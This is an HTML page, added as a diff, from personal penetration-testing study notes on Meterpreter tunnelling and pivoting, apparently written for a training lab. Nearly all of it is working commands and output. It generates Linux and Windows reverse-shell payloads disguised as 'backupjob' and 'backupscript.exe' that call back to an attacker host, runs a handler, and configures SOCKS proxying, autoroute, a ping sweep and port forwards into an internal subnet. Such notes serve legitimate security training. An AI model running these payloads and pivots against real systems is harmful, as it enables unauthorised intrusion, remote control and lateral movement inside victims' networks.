@@ -1,0 +1,403 @@
+
+
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" data-content_root="../../">
+<head>
+  <meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Meterpreter Tunneling and Port Forwarding &mdash; CelestialTech-Notes R1 documentation</title>
+      <link rel="stylesheet" type="text/css" href="../../_static/pygments.css?v=8f9ffe49" />
+      <link rel="stylesheet" type="text/css" href="../../_static/css/theme.css?v=e59714d7" />
+      <link rel="stylesheet" type="text/css" href="../../_static/dark_mode_css/general.css?v=c0a7eb24" />
+      <link rel="stylesheet" type="text/css" href="../../_static/dark_mode_css/dark.css?v=70edf1c7" />
+
+  
+      <script src="../../_static/jquery.js?v=5d32c60e"></script>
+      <script src="../../_static/_sphinx_javascript_frameworks_compat.js?v=2cd50e6c"></script>
+      <script src="../../_static/documentation_options.js?v=3b1ff954"></script>
+      <script src="../../_static/doctools.js?v=9bcbadda"></script>
+      <script src="../../_static/sphinx_highlight.js?v=dc90522c"></script>
+      <script src="../../_static/dark_mode_js/default_dark.js?v=fd565c74"></script>
+      <script src="../../_static/dark_mode_js/theme_switcher.js?v=358d3910"></script>
+    <script src="../../_static/js/theme.js"></script>
+    <link rel="index" title="Index" href="../../genindex.html" />
+    <link rel="search" title="Search" href="../../search.html" />
+    <link rel="next" title="Socat Redirection with a Reverse Shell" href="Socat%20Redirection%20with%20a%20Reverse%20Shell.html" />
+    <link rel="prev" title="Remote-Reverse Port Forwarding with SSH" href="Remote-Reverse%20Port%20Forwarding%20with%20SSH.html" /> 
+</head>
+
+<body class="wy-body-for-nav"> 
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+
+          
+          
+          <a href="../../index.html" class="icon icon-home">
+            CelestialTech-Notes
+          </a>
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <p class="caption" role="heading"><span class="caption-text">Offensive Methods</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../../OFSEC/recon/Active%20Scanning.html">Active Scanning (T5195)</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../OFSEC/evasion/Evading%20EDR%20and%20AntiVirus.html">Evading EDR and AntiVirus</a></li>
+</ul>
+<p class="caption" role="heading"><span class="caption-text">Reconnaissance</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../Reconnaissance/Penetration%20Testing%20Overview.html">Penetration Testing Overview</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Reconnaissance/Network%20Enumeration%20with%20nmap.html">Network Enumeration with nmap</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Reconnaissance/Footprinting.html">Footprinting</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Reconnaissance/Infrastructure%20Enumeration.html">Infrastructure Based Enumeration</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Reconnaissance/Host%20Enumeration.html">Host Based Enumeration</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Reconnaissance/fingerprinting.html">fingerprinting</a></li>
+</ul>
+<p class="caption" role="heading"><span class="caption-text">Initial Access</span></p>
+<ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="File%20Inclusion.html">File Inclusion</a></li>
+<li class="toctree-l1"><a class="reference internal" href="SSH%20Forwarding.html">SSH Forwarding</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Dynamic%20Port%20Forwarding%20with%20SSH%20and%20SOCKS%20Tunneling.html">Dynamic Port Forwarding with SSH and SOCKS Tunneling</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Remote-Reverse%20Port%20Forwarding%20with%20SSH.html">Remote-Reverse Port Forwarding with SSH</a></li>
+<li class="toctree-l1 current"><a class="current reference internal" href="#">Meterpreter Tunneling and Port Forwarding</a><ul>
+<li class="toctree-l2"><a class="reference internal" href="#description">Description</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#creating-a-shell-on-the-pivot-host">Creating a shell on the pivot host</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#configuring-msf-s-socks-proxy">Configuring MSF’s SOCKS Proxy</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#listing-active-routes-with-autoroute">Listing active routes with Autoroute</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#testing-the-proxychain-config">Testing the proxychain config</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="#port-forwarding-with-msf">Port Forwarding with MSF</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#meterpreter-reverse-port-forwarding">Meterpreter Reverse Port Forwarding</a></li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="Socat%20Redirection%20with%20a%20Reverse%20Shell.html">Socat Redirection with a Reverse Shell</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Socat%20Redirection%20with%20a%20Bind%20Shell.html">Socat Redirection with a Bind Shell</a></li>
+<li class="toctree-l1"><a class="reference internal" href="SSH%20for%20Windows%3A%20plink.exe.html">SSH for Windows: plink.exe</a></li>
+<li class="toctree-l1"><a class="reference internal" href="SSH%20Pivoting%20with%20Sshuttle.html">SSH Pivoting with Sshuttle</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Web%20Server%20Pivoting%20with%20Rpivot.html">Web Server Pivoting with Rpivot</a></li>
+</ul>
+<p class="caption" role="heading"><span class="caption-text">Tools</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Active%20Directory.html">Active Directory</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Bash.html">console</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/bettercap.html">bettercap</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Bitlocker.html">Bitlocker</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/bloodhound.py.html">bloodhound.py</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Certificates.html">Certificates</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/cewl.html">cewl</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/chisel.html">chisel</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Compliance%20Standards.html">Compliance Standards</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Compliance%20Standards.html#references">References</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/crawling.html">crawling</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/crowbar.html">crowbar</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/crunch.html">crunch</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/cupp.html">cupp</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/CVSS.html">CVSS</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/DKIM.html">DKIM</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/DMARC.html">DMARC</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/DNS.html">DNS</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/dnsenum.html">dnsenum</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/dnsrecon.html">dnsrecon</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/dnsx.html">dnsx</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/ettercap.html">ettercap</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/evil-winrm.html">evil-winrm</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/fail2ban.html">fail2ban</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/ffuf.html">ffuf</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/fierce.html">fierce</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/File%20Encryption%20on%20Linux.html">File Encryption on Linux</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/File%20Encryption%20Windows.html">File Encryption on Windows</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/finalRecon.html">finalRecon</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Firefox%20Decrypt.html">Firefox Decrypt</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/FTP.html">FTP</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/git.html">git</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/gobuster.html">gobuster</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/hashcat.html">hashcat</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/hydra.html">hydra</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/impacket.html">imapacket</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/invoke-TheHash.html">Invoke-TheHash</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/netstat.html">netstat</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/netstat.html#usage">Usage</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/subfinder.html">subfinder</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/smtp-user-enum.html">smtp-user-enum</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/winrm.html">winrm</a></li>
+</ul>
+
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../../index.html">CelestialTech-Notes</a>
+      </nav>
+
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          <div role="navigation" aria-label="Page navigation">
+  <ul class="wy-breadcrumbs">
+      <li><a href="../../index.html" class="icon icon-home" aria-label="Home"></a></li>
+      <li class="breadcrumb-item active">Meterpreter Tunneling and Port Forwarding</li>
+      <li class="wy-breadcrumbs-aside">
+            <a href="../../_sources/CPTS/Initial Access/Meterpreter Tunneling and Port Forwarding.rst.txt" rel="nofollow"> View page source</a>
+      </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+             
+  <section id="meterpreter-tunneling-and-port-forwarding">
+<h1>Meterpreter Tunneling and Port Forwarding<a class="headerlink" href="#meterpreter-tunneling-and-port-forwarding" title="Link to this heading"></a></h1>
+<p>Date: 2024-11-02 14:33</p>
+<p>Status:</p>
+<p>Tags:</p>
+<section id="description">
+<h2>Description<a class="headerlink" href="#description" title="Link to this heading"></a></h2>
+<p>There are situation where you may want to drop a shell on the pivot host instead of using SSH</p>
+<section id="creating-a-shell-on-the-pivot-host">
+<h3>Creating a shell on the pivot host<a class="headerlink" href="#creating-a-shell-on-the-pivot-host" title="Link to this heading"></a></h3>
+<p>Step 1. Create the shell and upload it to the pivot host</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080</span>
+
+<span class="go">[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload</span>
+<span class="go">[-] No arch selected, selecting arch: x64 from the payload</span>
+<span class="go">No encoder specified, outputting raw payload</span>
+<span class="go">Payload size: 130 bytes</span>
+<span class="go">Final size of elf file: 250 bytes</span>
+<span class="go">Saved as: backupjob</span>
+</pre></div>
+</div>
+<p>Step 2: Configure and start the multi handler</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">msf6 &gt; use exploit/multi/handler</span>
+
+<span class="go">[*] Using configured payload generic/shell_reverse_tcp</span>
+<span class="go">msf6 exploit(multi/handler) &gt; set lhost 0.0.0.0</span>
+<span class="go">lhost =&gt; 0.0.0.0</span>
+<span class="go">msf6 exploit(multi/handler) &gt; set lport 8080</span>
+<span class="go">lport =&gt; 8080</span>
+<span class="go">msf6 exploit(multi/handler) &gt; set payload linux/x64/meterpreter/reverse_tcp</span>
+<span class="go">payload =&gt; linux/x64/meterpreter/reverse_tcp</span>
+<span class="go">msf6 exploit(multi/handler) &gt; run</span>
+<span class="go">[*] Started reverse TCP handler on 0.0.0.0:8080</span>
+</pre></div>
+</div>
+<p>step 3: Run the shell on the pivot server</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">ubuntu@WebServer:~$ </span>ls
+
+<span class="go">backupjob</span>
+<span class="gp">ubuntu@WebServer:~$ </span>chmod<span class="w"> </span>+x<span class="w"> </span>backupjob
+<span class="gp">ubuntu@WebServer:~$ </span>./backupjob
+</pre></div>
+</div>
+<p>Now that we are connected to the pivot host via the created shell, we can scan that network.</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">meterpreter &gt; run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23</span>
+
+<span class="go">[*] Performing ping sweep for IP range 172.16.5.0/23</span>
+</pre></div>
+</div>
+</section>
+<section id="configuring-msf-s-socks-proxy">
+<h3>Configuring MSF’s SOCKS Proxy<a class="headerlink" href="#configuring-msf-s-socks-proxy" title="Link to this heading"></a></h3>
+<p><strong>Setup</strong></p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">msf6 &gt; use auxiliary/server/socks_proxy</span>
+
+<span class="go">msf6 auxiliary(server/socks_proxy) &gt; set SRVPORT 9050</span>
+<span class="go">SRVPORT =&gt; 9050</span>
+<span class="go">msf6 auxiliary(server/socks_proxy) &gt; set SRVHOST 0.0.0.0</span>
+<span class="go">SRVHOST =&gt; 0.0.0.0</span>
+<span class="go">msf6 auxiliary(server/socks_proxy) &gt; set version 4a</span>
+<span class="go">version =&gt; 4a</span>
+<span class="go">msf6 auxiliary(server/socks_proxy) &gt; run</span>
+<span class="go">[*] Auxiliary module running as background job 0.</span>
+
+<span class="go">[*] Starting the SOCKS proxy server</span>
+<span class="go">msf6 auxiliary(server/socks_proxy) &gt; options</span>
+
+<span class="go">Module options (auxiliary/server/socks_proxy):</span>
+
+<span class="go">Name     Current Setting  Required  Description</span>
+<span class="go">----     ---------------  --------  -----------</span>
+<span class="go">SRVHOST  0.0.0.0          yes       The address to listen on</span>
+<span class="go">SRVPORT  9050             yes       The port to listen on</span>
+<span class="go">VERSION  4a               yes       The SOCKS version to use (Accepted: 4a,</span>
+<span class="go">                                        5)</span>
+
+
+<span class="go">Auxiliary action:</span>
+
+<span class="go">Name   Description</span>
+<span class="go">----   -----------</span>
+<span class="go">Proxy  Run a SOCKS proxy server</span>
+</pre></div>
+</div>
+<p><strong>Verify Running</strong></p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">msf6 auxiliary(server/socks_proxy) &gt; jobs</span>
+
+<span class="go">Jobs</span>
+<span class="go">====</span>
+
+<span class="go">Id  Name                           Payload  Payload opts</span>
+<span class="go">--  ----                           -------  ------------</span>
+<span class="go">0   Auxiliary: server/socks_proxy</span>
+</pre></div>
+</div>
+<p><strong>Setup proxy chains</strong></p>
+<p>Ensure your config file reflects your port</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">socks4      127.0.0.1 9050</span>
+</pre></div>
+</div>
+<p>Finally tell the SOCKS module to route all traffic via our Meterpreter session.</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">msf6 &gt; use post/multi/manage/autoroute</span>
+
+<span class="go">msf6 post(multi/manage/autoroute) &gt; set SESSION 1</span>
+<span class="go">SESSION =&gt; 1</span>
+<span class="go">msf6 post(multi/manage/autoroute) &gt; set SUBNET 172.16.5.0</span>
+<span class="go">SUBNET =&gt; 172.16.5.0</span>
+<span class="go">msf6 post(multi/manage/autoroute) &gt; run</span>
+
+<span class="go">[!] SESSION may not be compatible with this module:</span>
+<span class="go">[!]  * incompatible session platform: linux</span>
+<span class="go">[*] Running module against 10.129.202.64</span>
+<span class="go">[*] Searching for subnets to autoroute.</span>
+<span class="go">[+] Route added to subnet 10.129.0.0/255.255.0.0 from host&#39;s routing table.</span>
+<span class="go">[+] Route added to subnet 172.16.5.0/255.255.254.0 from host&#39;s routing table.</span>
+<span class="go">[*] Post module execution completed</span>
+</pre></div>
+</div>
+<p>It is also possible to add routes with <cite>autoroute</cite> by running autoroute from the Meterpreter session.</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">meterpreter &gt; run autoroute -s 172.16.5.0/23</span>
+
+<span class="go">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span>
+<span class="go">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span>
+<span class="go">[*] Adding a route to 172.16.5.0/255.255.254.0...</span>
+<span class="go">[+] Added route to 172.16.5.0/255.255.254.0 via 10.129.202.64</span>
+<span class="go">[*] Use the -p option to list all active routes</span>
+</pre></div>
+</div>
+<section id="listing-active-routes-with-autoroute">
+<h4>Listing active routes with Autoroute<a class="headerlink" href="#listing-active-routes-with-autoroute" title="Link to this heading"></a></h4>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">meterpreter &gt; run autoroute -p</span>
+
+<span class="go">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span>
+<span class="go">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span>
+
+<span class="go">Active Routing Table</span>
+<span class="go">====================</span>
+
+<span class="go">Subnet             Netmask            Gateway</span>
+<span class="go">------             -------            -------</span>
+<span class="go">10.129.0.0         255.255.0.0        Session 1</span>
+<span class="go">172.16.4.0         255.255.254.0      Session 1</span>
+<span class="go">172.16.5.0         255.255.254.0      Session 1</span>
+</pre></div>
+</div>
+</section>
+<section id="testing-the-proxychain-config">
+<h4>Testing the proxychain config<a class="headerlink" href="#testing-the-proxychain-config" title="Link to this heading"></a></h4>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn</span>
+</pre></div>
+</div>
+</section>
+</section>
+</section>
+<section id="port-forwarding-with-msf">
+<h2>Port Forwarding with MSF<a class="headerlink" href="#port-forwarding-with-msf" title="Link to this heading"></a></h2>
+<p>There is a module in msf that forwards ports.  We can use the shell on the remote host and forward ports.</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">meterpreter &gt; help portfwd</span>
+
+<span class="go">Usage: portfwd [-h] [add | delete | list | flush] [args]</span>
+
+
+<span class="go">OPTIONS:</span>
+
+<span class="go">    -h        Help banner.</span>
+<span class="go">    -i &lt;opt&gt;  Index of the port forward entry to interact with (see the &quot;list&quot; command).</span>
+<span class="go">    -l &lt;opt&gt;  Forward: local port to listen on. Reverse: local port to connect to.</span>
+<span class="go">    -L &lt;opt&gt;  Forward: local host to listen on (optional). Reverse: local host to connect to.</span>
+<span class="go">    -p &lt;opt&gt;  Forward: remote port to connect to. Reverse: remote port to listen on.</span>
+<span class="go">    -r &lt;opt&gt;  Forward: remote host to connect to.</span>
+<span class="go">    -R        Indicates a reverse port forward.</span>
+</pre></div>
+</div>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">meterpreter &gt; portfwd add -l 3300 -p 3389 -r 172.16.5.19</span>
+
+<span class="go">[*] Local TCP relay created: :3300 &lt;-&gt; 172.16.5.19:3389</span>
+</pre></div>
+</div>
+<p>The above command requests the Meterpreter session to start a listener on our attack host’s local port (-l) 3300 and forward all the packets to the remote (-r) Windows server 172.16.5.19 on 3389 port (-p) via our Meterpreter session. Now, if we execute xfreerdp on our localhost:3300, we will be able to create a remote desktop session.</p>
+</section>
+<section id="meterpreter-reverse-port-forwarding">
+<h2>Meterpreter Reverse Port Forwarding<a class="headerlink" href="#meterpreter-reverse-port-forwarding" title="Link to this heading"></a></h2>
+<p>Similar to local port forwards, Metasploit can also perform reverse port forwarding with the below command, where you might want to listen on a specific port on the compromised server and forward all incoming shells from the Ubuntu server to our attack host. We will start a listener on a new port on our attack host for Windows and request the Ubuntu server to forward all requests received to the Ubuntu server on port 1234 to our listener on port 8081.</p>
+<p>We can create a reverse port forward on our existing shell from the previous scenario using the below command. This command forwards all connections on port 1234 running on the Ubuntu server to our attack host on local port (-l) 8081. We will also configure our listener to listen on port 8081 for a Windows shell.</p>
+<p>Step 1.  Reverse port forwarding rules</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">meterpreter &gt; portfwd add -R -l 8081 -p 1234 -L 10.10.14.18</span>
+
+<span class="go">[*] Local TCP relay created: 10.10.14.18:8081 &lt;-&gt; :1234</span>
+</pre></div>
+</div>
+<p>Step 2: Configure and starting multi/handler</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">meterpreter &gt; bg</span>
+
+<span class="go">[*] Backgrounding session 1...</span>
+<span class="go">msf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp</span>
+<span class="go">payload =&gt; windows/x64/meterpreter/reverse_tcp</span>
+<span class="go">msf6 exploit(multi/handler) &gt; set LPORT 8081</span>
+<span class="go">LPORT =&gt; 8081</span>
+<span class="go">msf6 exploit(multi/handler) &gt; set LHOST 0.0.0.0</span>
+<span class="go">LHOST =&gt; 0.0.0.0</span>
+<span class="go">msf6 exploit(multi/handler) &gt; run</span>
+
+<span class="go">[*] Started reverse TCP handler on 0.0.0.0:8081</span>
+</pre></div>
+</div>
+<p>We can now create a reverse shell payload that will send a connection back to our Ubuntu server on 172.16.5.129:1234 when executed on our Windows host. Once our Ubuntu server receives this connection, it will forward that to attack host’s ip:8081 that we configured.</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234</span>
+</pre></div>
+</div>
+<p>Finally if we execute this payload on the Windows server we should get a shell via the pivot server.</p>
+</section>
+</section>
+
+
+           </div>
+          </div>
+          <footer><div class="rst-footer-buttons" role="navigation" aria-label="Footer">
+        <a href="Remote-Reverse%20Port%20Forwarding%20with%20SSH.html" class="btn btn-neutral float-left" title="Remote-Reverse Port Forwarding with SSH" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Previous</a>
+        <a href="Socat%20Redirection%20with%20a%20Reverse%20Shell.html" class="btn btn-neutral float-right" title="Socat Redirection with a Reverse Shell" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right" aria-hidden="true"></span></a>
+    </div>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>&#169; Copyright 2024, James Jamieson.</p>
+  </div>
+
+  Built with <a href="https://www.sphinx-doc.org/">Sphinx</a> using a
+    <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a>
+    provided by <a href="https://readthedocs.org">Read the Docs</a>.
+   
+
+</footer>
+        </div>
+      </div>
+    </section>
+  </div>
+  <script>
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script> 
+
+</body>
+</html>
